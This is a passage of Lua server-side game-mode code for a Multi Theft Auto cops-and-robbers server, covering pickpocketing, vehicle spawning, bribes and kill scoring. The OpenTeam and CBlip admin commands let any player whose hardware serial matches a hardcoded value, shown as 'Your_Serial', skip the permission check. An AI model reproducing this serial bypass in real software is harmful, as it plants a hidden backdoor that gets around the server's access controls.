       if getElementData(v,"Stats") == 0 and getPlayerTeam(v) == getTeamFromName(ChampionsT) and v ~= Player then 
	        removePedFromVehicle(v)
            local x,y,z = getElementPosition ( Player ) 
            setElementPosition ( v, x+math.random(-2,2), y+math.random(-2,2), z+1 )        
            setElementInterior(v,getElementInterior(Player))
            setElementDimension(v,getElementDimension(Player))
	    end
     end
   end 	 
  end
end
)

addCommandHandler("OpenTeam",
function(player,cmd,num,open)
	local serial = getPlayerSerial(player)
	if isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(player)),aclGetGroup("Admin")) 
	or  isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(player)),aclGetGroup("Leader")) or serial == "Your_Serial" then
	  if num == "1" then
		  if open then
		       ChampionsValue = "ON"
			   if isElement(BLIPChamoins) then destroyElement(BLIPChamoins) end if isElement(MarkerChamoins) then destroyElement(MarkerChamoins)  end --nu9aif
		  else
		       ChampionsValue = "OFF"
		  end
		  exports["guimessages"]:outputServer(player, "You set Team1 : "..ChampionsValue, 0, 255, 0)
		  triggerClientEvent("ChampionsEvent", resourceRoot,ChampionsValue,Champions2Value)
	  else
		  if open then
		       Champions2Value = "ON"
			   if isElement(BLIPChamoins) then destroyElement(BLIPChamoins) end if isElement(MarkerChamoins) then destroyElement(MarkerChamoins)  end --nu9aif
		  else
		       Champions2Value = "OFF"
		  end
		  exports["guimessages"]:outputServer(player, "You set Team2 : "..Champions2Value, 0, 255, 0)
		  triggerClientEvent("ChampionsEvent", resourceRoot,ChampionsValue,Champions2Value)
	 end	  
	end
end)

addCommandHandler("CBlip",
function(player,cmd)
	local serial = getPlayerSerial(player)
	if isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(player)),aclGetGroup("Admin")) 
	or  isObjectInACLGroup ("user."..getAccountName(getPlayerAccount(player)),aclGetGroup("Leader")) or serial == "Your_Serial" then
	        if BLIPChamoins then destroyElement(BLIPChamoins) destroyElement(MarkerChamoins) end
            local x,y,z = getElementPosition ( player ) 
		     BLIPChamoins = createBlip( x,y,z,53)
			 MarkerChamoins = createMarker ( x, y, z-1, "cylinder", 1.5, 255, 255, 0, 170 )
            setElementInterior(BLIPChamoins,getElementInterior(player))
            setElementDimension(BLIPChamoins,getElementDimension(player))	
			setElementInterior(MarkerChamoins,getElementInterior(player))
            setElementDimension(MarkerChamoins,getElementDimension(player))	
	end
end)




addEvent("setJailData", true)
addEventHandler("setJailData", resourceRoot,
function(PLR,Type, value)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then 
			--outputChatBox("Type: "..Type..", Value: "..value)
			if Type == "SEC" then
				setElementData(PLR, "Secs", value, false)
			elseif Type == "MIN" then
				setElementData(PLR, "Mins", value, false)
			elseif Type == "BAIL" then
				setElementData(PLR, "MBail", value, false)
			end
		end
	end
end)

 


-- Get the server's name
function getData()
	local sName = md5(getServerName())
	local sName = string.sub(sName,0,15)
	triggerClientEvent(source,"onGetServerData",source,sName)
end

 
-------------------------------------------- Pickpocket ---------------------------------------

addEvent("DRob", true)
function FDRob(PLR, targ)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if targ and isElement(targ) then
				if getElementData(targ, "protect") then
					exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][49], 255, 255, 0)
				elseif getElementData(targ, "Money") > 100 then
					local robM = math.ceil(getElementData(targ, "Money")/20)
					if robM > 200000 then
						robM = 199000+math.random(1000)
					end
					setElementData(PLR, "Money", getElementData(PLR, "Money")+robM)
					--setElementData(PLR, "Scores", getElementData(PLR, "Scores")+1)
					givePlayerScore (PLR,1)
					setElementData(PLR, "Rob", robM)
					setElementData(targ, "Money", getElementData(targ, "Money")-robM)
					--setElementData(targ, "Scores", getElementData(targ, "Scores")-1)
					givePlayerScore (targ,-1)
					setElementData(targ, "protect", true)
					exports["guimessages"]:outputServer(targ, tlng[plng[targ]][11], 255, 0, 0)
					--local vT = {PLR,targ}
					triggerClientEvent({PLR,targ},"robamount", resourceRoot, PLR, targ, robM)
				end
			end
		end
	end
end
addEventHandler("DRob", resourceRoot, FDRob)

-------------------------------------------- Bank ---------------------------------------


-------------------------------------------- Police Vehicle Marker ---------------------------------------

cars = {}
carsTimer = {}


function getPosHeli ()
       HeliMath = math.random(1,4)
	           HeliSpawnX,HeliSpawnZ = 1565.73962,28.40211
		if HeliMath == 1 then
				HeliSpawnY = -1641.93164
		elseif HeliMath == 2 then
				HeliSpawnY = -1658.2960
		elseif HeliMath == 3 then
				HeliSpawnY = -1697.2808
		elseif HeliMath == 4 then
				HeliSpawnY = -1710.4
		end
		return HeliSpawnX,HeliSpawnY,HeliSpawnZ

end

function onCreatePoliceCar(PLR,carName)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			local id = getVehicleModelFromName(carName)
			if (id) then
				if (isElement(cars[PLR])) then
					destroyElement(cars[PLR])
				end
				if ( getVehicleType ( id ) == "Helicopter" ) then
				local x, y, z = getPosHeli ()
				cars[PLR] = createVehicle(id, x, y, z, 0, 0, 90)
				setVehicleColor(cars[PLR], 0, 0, 255)
				else 
				local x, y, z = getElementPosition(PLR)
				cars[PLR] = createVehicle(id, x, y, z, 0, 0, 180)
				setVehicleColor(cars[PLR], 255, 255, 255)
				end
				addEventHandler("onVehicleExplode", cars[PLR], function() setTimer(function(car) if (isElement(car)) then destroyElement(car) end end, 5000, 1, source) end)
				addEventHandler("onVehicleExit", cars[PLR], function() if isVehicleEmpty(source) then return end carsTimer[source] = setTimer(function(car) if (isElement(car)) then destroyElement(car) end end, 120000, 1, PLR) end)
				addEventHandler("onVehicleEnter", cars[PLR], function() if isTimer(carsTimer[source]) then killTimer(carsTimer[source]) end end)
				warpPedIntoVehicle(PLR, cars[PLR])
				
			end
		end
	end
end
addEvent("onCreatePoliceCar", true)
addEventHandler("onCreatePoliceCar", resourceRoot, onCreatePoliceCar)

function getPosHeliTeam (PLR)
       if getPlayerTeam(PLR) == Grove then
		return 2529, -1678, 20
	   elseif getPlayerTeam(PLR) == Ballas then
        return 2192, -1326, 29, 180
	   elseif getPlayerTeam(PLR) == Vagos then
        return 2264,-1105,38, 270
       elseif getPlayerTeam(PLR) == Aztec then	
        return 1742.5, -1916, 30.5
       end		
end

function onSpawnVehicle(PLR,carName, x, y, z, r,isCarTeam)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			local id = getVehicleModelFromName(carName)
			if (id) then
				if (isElement(cars[PLR])) then
					destroyElement(cars[PLR])
				end
				if ( getVehicleType ( id ) == "Helicopter" ) then
				local x, y, z = getPosHeliTeam (PLR)
				cars[PLR] = createVehicle(id, x, y, z+1, 0, 0, tonumber(r))
				else
				cars[PLR] = createVehicle(id, x, y, z+1, 0, 0, tonumber(r))
				setElementFrozen(cars[PLR], true)
				setTimer(function ()
				  if isElement (cars[PLR]) then
				      setElementFrozen(cars[PLR], false)
				  end
				 end , 500, 1 )
				if id ~= 416 then
				    local r, g, b = math.random(255),math.random(255),math.random(255)
					local r1, g1, b1 = math.random(255),math.random(255),math.random(255)
					setVehicleColor(cars[PLR], r, g, b,r1, g1, b1)
				end
				end
				
				if isCarTeam then
				    local Team = getPlayerTeam(PLR)
					if Team and isCarTeam == getTeamName(Team) then
				       local r, g, b = getTeamColor ( Team )
				       setVehicleColor(cars[PLR], r, g, b,255,255,255,255,255,255,255,255,255)
					   setElementData(cars[PLR],"TeamCar",getTeamName(Team))
					   addEventHandler ("onVehicleStartEnter", cars[PLR], onEnter)
					end   
				end
				
				addEventHandler("onVehicleExplode", cars[PLR], function() setTimer(function(car) if (isElement(car)) then destroyElement(car) end end, 5000, 1, source) end)
				addEventHandler("onVehicleExit", cars[PLR], function() if isVehicleEmpty(source) then return end carsTimer[source] = setTimer(function(car) if (isElement(car)) then destroyElement(car) end end, 120000, 1, PLR) end)
				addEventHandler("onVehicleEnter", cars[PLR], function() if isTimer(carsTimer[source]) then killTimer(carsTimer[source]) end end)
				warpPedIntoVehicle(PLR, cars[PLR])
			end
		end
	end
end
addEvent("onSpawnVehicle", true) 
addEventHandler("onSpawnVehicle", resourceRoot, onSpawnVehicle)

function onEnter(player,seat) 
    local Team = getPlayerTeam(player) 
    if Team then
        local data = getElementData(source,"TeamCar")
        if seat == 0 and data ~= getTeamName(Team) then
            cancelEvent()
            local r, g, b = getTeamColor ( getTeamFromName(data) )
            outputChatBox("This Car For "..data.." Team.",player,r, g, b)
        end
    end   
end

addEventHandler("onPlayerQuit", root, function() 
    if isElement(cars[source]) then
       destroyElement(cars[source])
	   if isTimer(carsTimer[cars[source]]) then killTimer(carsTimer[cars[source]]) end
	end
end)



----------------------------------------------------------------
addEvent("offerB", true)
function FofferB(PLR, bribed, bribe)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			--vT = {PLR,bribed}
			triggerClientEvent("CofferB", resourceRoot, PLR, bribed, bribe)
			--vT = nil
		end
	end
end
addEventHandler("offerB", resourceRoot, FofferB)

addEvent("ACCB", true)
function FACCB(briber, bribed)
	if client then
		CICTC(eventName,source,bribed)
		if not fake then
			if getElementData(briber, "Stats") < 1 and getElementData(briber, "WantLvl") > 2 or getElementData(briber, "Stats") == 3 then
				if getElementData(briber, "BribeAcc") then return end
				if getElementData(bribed, "OfferAcc") then return end
				setElementData(bribed,"BRCH",true)
				--triggerClientEvent(bribed,"OPEC",bribed,vTT)
				--vT = {briber,bribed}
				triggerClientEvent({briber,bribed},"CACCB", resourceRoot, briber, bribed)
				setElementData(briber, "BribeAcc", true)
				setElementData(bribed, "OfferAcc", true)
			end
		end
	end
end
addEventHandler("ACCB", resourceRoot, FACCB)



function OnLoginRE ()
    local acc = getPlayerAccount (source)
    if not (isGuestAccount (acc)) then
	    if getAccountData (acc, "ARecounctBug") then
	        setElementData(source, "RecounectBug", true)
	        setAccountData(acc, "ARecounctBug", false)
        end
		local dd = getAccountData (acc, "AScores")
	    if dd then
	        setElementData(source, "Scores", tonumber(dd)) 
		else
            setElementData(source, "Scores", 0) 		
        end		
    end
end
addEventHandler ("onPlayerLogin", root, OnLoginRE)

----------------------------------------------------------   Fixed Bug Car Player Damage ----------------------------------------------------------

addEventHandler ( "onPlayerDamage", root, 
function (attacker, weapon)
	if attacker and weapon == 0 or weapon == 1 then
		if getPlayerTeam(source) == Police then
            local wantedLevel = getElementData(attacker, "WantLvl")
			if wantedLevel < 3 then 
	            setElementData(attacker,"WantLvl",3)
            end
		end
	end
end
) 
-----------------------------------------Fixed Bug Jail Weapon-----------------------------------



     MarkerCarSea1 = createMarker( 2616,602,7.5, 'cylinder', 5, 255, 255, 0, 0 )
     MarkerCarSea2 = createMarker( 73,-1512,3.5, 'cylinder', 5, 255, 255, 0, 0 )
     MarkerCarSea3 = createMarker( -1246,478.5,6.5, 'cylinder', 5, 255, 255, 0, 0 )

carsTimer = {}

addEvent('CreateCarInSea', true)
addEventHandler('CreateCarInSea', resourceRoot,
function(PLR,nameCar )
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if isElement( cars[PLR] ) then destroyElement( cars[PLR] ) cars[PLR] = nil end
			local id = getVehicleModelFromName(nameCar)
			if isElementWithinMarker (PLR,MarkerCarSea1) then
				cars[PLR] = createVehicle( id, 2626, 555, 1,0,0,90 )
			elseif isElementWithinMarker (PLR,MarkerCarSea2) then
				cars[PLR] = createVehicle( id, 66, -1500, 1 )
			elseif isElementWithinMarker (PLR,MarkerCarSea3) then
				cars[PLR] = createVehicle( id, -1239, 492, 1 )
			end
			if not cars[PLR] then return end
			warpPedIntoVehicle ( PLR, cars[PLR] )
		end
	end
end
)

function isVehicleEmpty(veh)
     local cc = nil
     local occupants = getVehicleOccupants(veh)
     local seats = getVehicleMaxPassengers(veh)
     for seat = 0, seats do
          if occupants[seat] then cc = true end
     end
     return 
end

addEventHandler('onPlayerQuit', root,
function()
        if isElement( cars[source] ) then
                destroyElement(cars[source] )
        end
end
)


addEvent("EqVar", true)
function FEqVar(PLR,vara, varb, cam,arga, nnn,r,g,b)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			argb = getPedOccupiedVehicle(PLR)
			if vara then
				--nn = {}
				--nn[1],nn[2],nn[3],nn[4],nn[5],nn[6],nn[7],nn[8],nn[9],nn[10],nn[11],nn[12] = getVehicleColor(argb, true)
				setVehicleVariant(argb, vara, varb)
				--setVehicleColor(argb, nn[1],nn[2],nn[3],nn[4],nn[5],nn[6],nn[7],nn[8],nn[9],nn[10],nn[11],nn[12])
				--nn = false
			end
			if arga then
				setVehicleColor(argb,arga[1],arga[2],arga[3],arga[4],arga[5],arga[6],arga[7],arga[8],arga[9],arga[10],arga[11],arga[12])
				setVehicleHeadLightColor(argb,arga[13],arga[14],arga[15])
				setVehiclePaintjob(argb,arga[16])
				setVehiclePlateText(argb,arga[17])
				if arga[18] then
					for k,v in pairs(getVehicleUpgrades(argb)) do
						removeVehicleUpgrade(argb,v)
					end
					for k,v in pairs(arga[18]) do
						addVehicleUpgrade(argb,v)
					end
				end
			end
			if nnn then
				argc = nil
				for k,v in pairs(getAttachedElements(argb)) do
					if getElementType(v) == "marker" then
						argc = true
						break
					end
				end
				if not argc then
					nn = {}
					if getVehicleType(argb) == "Automobile" then
						for i=1,4 do
							nn[i] = createMarker(1050, -1017.75, 0, "corona", 1, r,g,b)
						end
						attachElements(nn[1], argb, 0, 2.5, -.5)
						attachElements(nn[2], argb, 0, -2.3, -.5)
						attachElements(nn[3], argb, -.8, 0, -.5)
						attachElements(nn[4], argb, .8, 0, -.5)
					else
						nn[1] = createMarker(1050, -1017.75, 0, "corona", 1, r,g,b)
						attachElements(nn[1], argb, 0, 0, -.5)
					end
					nn = nil
				else
					for k,v in pairs(getAttachedElements(argb)) do
						if getElementType(v) == "marker" then
							setMarkerColor(v,r,g,b,255)
						end
					end
				end
			else
				for k,v in pairs(getAttachedElements(argb)) do
					if getElementType(v) == "marker" then
						destroyElement(v)
					end
				end
			end
			if cam then
				setCameraMatrix(PLR, 1045, -1022.75, 16, 1050, -1017.75, 14.5)
				setVehicleEngineState(argb, false)
			end
		end
	end
end
addEventHandler("EqVar", resourceRoot, FEqVar)

--[[setWeaponProperty(41,"poor","weapon_range",1)
setWeaponProperty(41,"std","weapon_range",1)
setWeaponProperty(41,"pro","weapon_range",1)]]

TBL = {
}


--[[
function SVRCSH()
	outputChatBox("Hit-F")
end
addEventHandler("onColShapeHit",root,SVRCSH)
]]


CJTGE={}
CJTGE[1]=true
CJTGE[3]=true

function OPW(amm,killer)
	local klr
	if killer then
		if getElementType(killer) == "vehicle" then
			klr = getVehicleOccupant(killer)
		elseif getElementType(killer) == "player" then
			klr = killer
		end
	end
	if klr == source then
		klr = nil
	end
	if getPlayerTeam(source) == Police then
		Parga = "PXP"
		OPE[tostring(getElementData(source,"ID"))]["ARAssist"] = {}
	else
		Parga = "GXP"
	end
	if getElementData(source,"BPerk") then
		FDSPPE(source,"BPerk")
	end
	local attached = getAttachedElements ( source )
	if ( attached ) then
		for k,element in pairs(attached) do
			if isElement(element) and getElementType ( element ) == "blip" and getBlipIcon(element) == 41 then
				destroyElement ( element )
			end
		end
	end
	if getElementData(source,"GPerk") == 2 and klr and getPlayerTeam(source) ~= Police then
		arga = createBlipAttachedTo(klr,41,2,255,0,0,255,0,99999,source)
		setElementData(source,"BPerk",arga)
	end
	if getElementData(source,"EPerk") and getElementType(getElementData(source,"EPerk")) == "colshape" then
		FDSPPE(source,"EPerk")
	end
	local argd = getElementData(source,"Job")
	if klr then
		if klr ~= source and getElementData(klr,"Job") == 1 and getElementData(source,"Stats") < 2 and getElementData(source,"Hits") then
			setTimer(removeElementData,1000,1,source,"Hits")
		end
		local Karga,Kargb
		if getPlayerTeam(klr) == Police then
			Karga = "PXP"
			Kargb = "PLVL"
		else
			Karga = "GXP"
			Kargb = "GLVL"
		end
		local VAR = getElementData(source,"PTF")
		local KAR = getElementData(klr,"PTF")
		local VTN = getTeamName(getPlayerTeam(source))
		local KTN = getTeamName(getPlayerTeam(klr))
		local arga,argb,argc
		local arge = getElementData(klr,"Job")
		if getPlayerTeam(source) ~= Medic and getPlayerTeam(klr) ~= Medic and CJTGE[argd] and CJTGE[arge] or getPlayerTeam(klr) == Police then--or getPlayerTeam(source) == NoTeam and CJTGE[argd] and getPlayerTeam(klr) == NoTeam and CJTGE[arge]
			if getPlayerTeam(klr) == Police then
				argc = nil
				if isElement(VAR) and klr and isRadarAreaFlashing(getElementData(VAR,"TFA")) then
					if (getElementData(VAR,"TFG") and getElementData(VAR,"TFG") == getPlayerTeam(source)) 
					or (getElementData(VAR,"TFT") and getElementData(VAR,"TFT") == VTN ) then
						argc = 10
						setElementData(klr,"Money",getElementData(klr,"Money")+200)
					end
				elseif klr and getElementData(source,"InMission") then
				        argc = 10
						setElementData(klr,"Money",getElementData(klr,"Money")+200)
				end
				if not argc then
					argc = 16
					argf = getElementData(source,"WantLvl")
					if argf > 2 then
						argg = argf*500
						setElementData(klr,"Money",getElementData(klr,"Money")+argg)
						exports["guimessages"]:outputServer(klr,tlng[plng[klr]][30]..''..argg..''..tlng[plng[klr]][31],0,255,0)
					end
					if not getElementData(source, "InMission")  then
					   setElementData(source,"Stats",3)
					 end    
				end
			end
			if getElementData(source,"Stats") < 2 and getElementData(klr,"Stats") < 2 or getPlayerTeam(klr) == Police then
				--outputChatBox("killer "..getElementType(klr))
				EBV = "Assist"
				GETP(source,Parga,klr,Karga,Kargb,arga,argb,argc)
			end
		end
	elseif not klr then
		OPE[tostring(getElementData(source,"ID"))]["Payback"] = nil
		if getPlayerTeam(source) ~= NoTeam and getPlayerTeam(source) ~= Medic or getPlayerTeam(source) == NoTeam and CJTGE[argd] then
			--local next = next
			if not table.empty(OPE[tostring(getElementData(source,"ID"))]["Assist"]) then
				EBV = "Assisted Suicide"
				OPASS(source,Parga)
			else
				setElementData(source,Parga,getElementData(source,Parga)-20)
				local vT = {}
				vT[source] = {"-20 Suicide"}
				triggerClientEvent(source,"OPEC",source,vT)
			end
		end
	end
end
addEventHandler("onPlayerWasted",root,OPW)



function RGBToHex(red, green, blue)
    if((red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255)) then
        return nil
    end
    return string.format("#%.2X%.2X%.2X", red, green, blue)
end

function outPutDxChat (Text,player,r,p,g)
local hex = RGBToHex ( r,p,g )
exports["guimessages"]:outputServer(player,""..hex.. ""..Text,255,0,0)
end

addEvent("SPSOG",true)
function FSPSOG(PLR,x,y,z,za,zb,r,xb,yb,xc,yc,xd,yd,xe,ye)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if getElementHealth(PLR) > 0 then
				setPedAnimation(PLR,"BOMBER","BOM_Plant",3000,false,true,true,false)
				setTimer(function(PLR,x,y,z,za,zb,r,xb,yb,xc,yc,xd,yd,xe,ye)
					if getElementHealth(PLR) > 0 then
						local cstinger,stinger = getElementData(PLR,"EPerk")
						if cstinger then
							stinger = getElementData(cstinger,"Stinger")
							if stinger then
								destroyElement(stinger)
							end
							removeElementData(cstinger,"Stinger")
							destroyElement(cstinger)
						end
						stinger = createObject(2899,x,y,z,za,-zb,r)
						cstinger = createColPolygon(x,y,xb,yb,xc,yc,xe,ye,xd,yd)
						setElementData(cstinger,"Stinger",stinger)
						setElementData(PLR,"EPerk",cstinger)
						--stinger,cstinger = nil,nil
					end
				end,1500,1,PLR,x,y,z,za,zb,r,xb,yb,xc,yc,xd,yd,xe,ye)
			end
		end
	end
end
addEventHandler("SPSOG",resourceRoot,FSPSOG)

function OPASS(PLR,Parga,klr,Karga,Kargb)
	local vT,vTT,arga = {},{}
	for k,v in pairs(OPE[tostring(getElementData(PLR,"ID"))]["Assist"]) do
		--outputChatBox("k = "..tostring(k))
		--outputChatBox("v = "..tostring(v))
		if klr then
		   killerteam = getPlayerTeam(klr)
		else
		  if isElement(k) then
		   killerteam = getPlayerTeam(k)
		  end 
		end
		if isElement(k) and getElementType ( k ) == "player" and k ~= klr and (getPlayerTeam(k) ==  killerteam ) and getElementData(k,"ID") then
			if not klr then
				if k and getPlayerTeam(k) and getPlayerTeam(k) == Police or getPlayerTeam(k) == NoTeam and not getElementData(k,"Group") or getPlayerTeam(k) == Medic then
					Karga = nil
					Kargb = nil
				else
					Karga = "GXP"
					Kargb = "GLVL"
				end
			end
			--setElementData(k,Karga,getElementData(k,Karga)+math.ceil(v/10))
			if Karga then
				table.insert(vT,k)
				vTT[k] = {"+"..math.ceil(v/10).." "..EBV}
				arga = getElementData(k,Karga)+math.ceil(v/10)
				OPLU(k,Karga,Kargb,arga)
			end
		end
	end
	triggerClientEvent(vT,"OPEC",resourceRoot,vTT)
	if not klr then
		vT = {}
		vT[PLR] = {"-10 Suicide"}
		setElementData(PLR,Parga,getElementData(PLR,Parga)-10)
		triggerClientEvent(PLR,"OPEC",PLR,vT)
	end
	OPE[tostring(getElementData(PLR,"ID"))]["Assist"] = {}
end

function GETP(PLR,Parga,klr,Karga,Kargb,arga,argb,argc)
	CEBV = {}
	CEBV[klr] = {}
	if arga then
		table.insert(CEBV[klr],arga)
		ttE = 15
	else
		if getPlayerTeam(klr) == Police then
			table.insert(CEBV[klr],"+"..argc.." Kill")
			ttE = argc
		else
			table.insert(CEBV[klr],"+10 Kill")
			ttE = 10
		end
	end
	if argb then
		table.insert(CEBV[klr],argb)
		ttE = ttE+argc
	end
	OPASS(PLR,Parga,klr,Karga,Kargb)
	EBV = OPE[tostring(getElementData(klr,"ID"))]["Avenger"][1]
	if EBV then
		table.insert(CEBV[klr],"+2 Multi Kill")
		ttE = ttE+2
		killTimer(OPE[tostring(getElementData(klr,"ID"))]["Avenger"][2])
		OPE[tostring(getElementData(klr,"ID"))]["Avenger"][1] = getPlayerTeam(PLR)
		OPE[tostring(getElementData(klr,"ID"))]["Avenger"][2] = setTimer(function(klr) OPE[getElementData(klr,"ID")]["Avenger"] = {} end,1000,1,klr)
	end
	if getPlayerTeam(klr) ~= NoTeam then
		EBV = OPE[tostring(getElementData(PLR,"ID"))]["Avenger"][1]
		if EBV == getPlayerTeam(klr) then
			table.insert(CEBV[klr],"+2 Avenger")
			ttE = ttE+2
			killTimer(OPE[tostring(getElementData(PLR,"ID"))]["Avenger"][2])
			OPE[tostring(getElementData(PLR,"ID"))]["Avenger"] = {}
		end
		EBV = OPE[tostring(getElementData(PLR,"ID"))]["Rescuer"]
		if EBV[1] and EBV[1] ~= klr and getPlayerTeam(EBV[1]) == getPlayerTeam(klr) and getElementHealth(EBV[1]) < 30 and getPedArmor(EBV[1]) < 1 then
			table.insert(CEBV[klr],"+2 Rescuer")
			ttE = ttE+2
			killTimer(OPE[tostring(getElementData(PLR,"ID"))]["Rescuer"][2])
			OPE[tostring(getElementData(PLR,"ID"))]["Rescuer"] = {}
		end
	end
	EBV = OPE[tostring(getElementData(klr,"ID"))]["Payback"]
	if EBV == PLR then
		table.insert(CEBV[klr],"+2 Payback")
		ttE = ttE+2
		OPE[tostring(getElementData(klr,"ID"))]["Payback"] = nil
	end
	EBV = OPE[tostring(getElementData(PLR,"ID"))]["Payback"]
	if EBV == klr then
		table.insert(CEBV[klr],"+2 Comeback")
		ttE = ttE+2
	end
	if getElementHealth(klr) == 0 then
		table.insert(CEBV[klr],"+2 Afterlife")
		ttE = ttE+2
	end
	OPE[tostring(getElementData(PLR,"ID"))]["Payback"] = klr
	if getPlayerTeam(source) ~= NoTeam and getPlayerTeam(source) ~= Medic or getPlayerTeam(source) == NoTeam and CJTGE[getElementData(source,"Job")] then
		local vT = {}
		if getPlayerTeam(source) == Police then
			vT[PLR] = {"-3 Death"}
			setElementData(PLR,Parga,getElementData(PLR,Parga)-3)
		else
			vT[PLR] = {"-2 Death"}
			setElementData(PLR,Parga,getElementData(PLR,Parga)-2)
		end
		triggerClientEvent(PLR,"OPEC",PLR,vT)
	end
	
	ttE = getElementData(klr,Karga)+ttE
	OPLU(klr,Karga,Kargb,ttE)
	
	triggerClientEvent(klr,"OPEC",klr,CEBV)
end

function OPLU(klr,Karga,Kargb,ttE)
	val = getElementData(klr,Kargb)*100
	if ttE > val then
		ttE = ttE-val
		setElementData(klr,Kargb,getElementData(klr,Kargb)+1)
		setElementHealth(klr,100)
		setPedArmor(klr,100)
	end
	setElementData(klr,Karga,ttE)
end

--MEB = {}
--OPB = {}
OPE = {}

function OPD(attacker,wp,body,loss)
	local atk,et
	if attacker then
		et = getElementType(attacker)
		if et == "vehicle" then
			atk = getVehicleOccupant(attacker)
		elseif et == "player" then
			atk = attacker
		end
	end
	--[[if atk == source then
		atk = nil
	end]]
	if atk and atk ~= source then 
		local atem,vtem,agrp,vgrp = getPlayerTeam(atk),getPlayerTeam(source),getElementData(atk,"Group"),getElementData(source,"Group")
		if atem == NoTeam and agrp or vtem ~= Medic and atem ~= Medic or atem == Police and getElementData(source,"WantLvl") > 2 then
			if getElementData(source,"Stats") < 2 and getElementData(atk,"Stats") < 2 then
				if atem == NoTeam and not agrp or vtem == NoTeam and not vgrp and getElementData(source,"Job") > 3 then
				else
					local aid,vid = getElementData(atk,"ID"),getElementData(source,"ID")
					OPE[tostring(aid)]["Rescuer"][1] = source
					if isTimer(OPE[tostring(aid)]["Rescuer"][2]) then
						resetTimer(OPE[tostring(aid)]["Rescuer"][2])
					else
						OPE[tostring(aid)]["Rescuer"][2] = setTimer(function(atk) OPE[tostring(aid)]["Rescuer"] = {} end,1000,1,atk)
					end
					local EBV = OPE[tostring(vid)]["Assist"][atk]
					if not EBV then
						OPE[tostring(vid)]["Assist"][atk] = loss
					elseif EBV < 50 then
						EBV = EBV+loss
						if EBV > 50 then
							EBV = 50
						end
						OPE[tostring(vid)]["Assist"][atk] = EBV
					end
					--EBV = nil
				end
			end
		end
	end
end
addEventHandler("onPlayerDamage",root,OPD)

for k,v in pairs(getElementsByType("player")) do
	arga = getElementData(v,"ID")
	if arga and not IDS[arga] then
		IDS[arga] = true
	else
		for i=1,getMaxPlayers() do
			if not IDS[i] then
				IDS[i] = true
				setElementData(v,"ID",i)
				OPE[tostring(i)] = {["Assist"]={},["Rescuer"]={},["Avenger"]={},["ARAssist"]={},["Payback"]=nil}
				break
			end
		end
	end
	if not OPE[tostring(getElementData(v,"ID"))] then
		OPE[tostring(getElementData(v,"ID"))] = {["Assist"]={},["Rescuer"]={},["Avenger"]={},["ARAssist"]={},["Payback"]=nil}
	end
end
arga = nil

--[[function OED()
	if getElementData(source,"HSHTR") then
		removeElementData(source,"HSHTR")
	end
end
addEventHandler("onElementDestroy",root,OED)]]

addEventHandler("onElementDestroy",root,function()
	if getElementType(source) == "vehicle" then
		if getElementData(source,"HSHTR") then
			removeElementData(source,"HSHTR")
		end
		for k,v in pairs(getAttachedElements(source)) do
			if isElement(v) then
				destroyElement(v)
			end
		end
	end
end)

addEvent("RDOMF",true)
addEventHandler("RDOMF",resourceRoot,function(PLR)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			redirectPlayer(PLR,GWIPIp,getServerPort())
		end
	end
end)

addEvent("SVP",true)
addEventHandler("SVP",resourceRoot,function(PLR,arga)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			giveWeapon(PLR,arga[1],arga[2])
		end
	end
end)

function WAC(PLR)
	accName = getAccountName(getPlayerAccount(PLR))
	if isObjectInACLGroup("user." .. accName, aclGetGroup("Console")) then
		outputChatBox("!!!!______ Weapons Flags has been flipped ______!!!!",PLR,255,255,0)
		exports["guimessages"]:outputServer(PLR,"!!!!______ Weapons Flags has been flipped ______!!!!",255,255,0)
		for k,v in pairs(AWPSP) do
			if k == 22 or k == 26 or k == 28 or k == 32 then
				setWeaponProperty(k,"poor","flags",0x000800)
				setWeaponProperty(k,"std","flags",0x000800)
			else
				setWeaponProperty(k,"poor","flags",0x000010)
				setWeaponProperty(k,"poor","flags",0x000020)
				setWeaponProperty(k,"std","flags",0x000020)
				if k > 32 then
					setWeaponProperty(k,"poor","flags",0x008000)
					setWeaponProperty(k,"std","flags",0x000020)
					if k > 33 then
						setWeaponProperty(k,"std","flags",0x000010)
					end
				end
			end
		end
	end
	accName = nil
end 

collectgarbage("collect")